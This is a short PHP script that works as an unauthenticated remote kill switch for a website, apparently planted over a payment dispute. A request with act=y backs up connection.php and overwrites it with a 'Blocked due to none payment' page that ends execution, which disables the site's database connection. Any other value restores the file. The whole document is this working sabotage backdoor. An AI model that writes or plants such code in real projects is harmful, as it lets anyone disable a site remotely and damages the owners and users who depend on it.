<?php
$val = $_REQUEST['act']."";
$block = "<title>Blocked due to none payment</title><table width='100%' border='0' cellspacing='0' cellpadding='0'>
  <tr>
    <td align='center' height = '1600' valign='top'><img src='http://rockon-djkhan.com/none-payment.jpg' width='800'></td>
  </tr>
</table><?=exit?>";
$myFile = "connection.php";
if (trim($val)=="y"){
	copy($myFile,"sdata/".$myFile);
	$fh = fopen($myFile, 'w') or die("can't open file");
	fwrite($fh, $block);
	fclose($fh);
	echo "Blocked";
}else{
	copy("sdata/".$myFile,$myFile);
	echo "Removed";
}
?>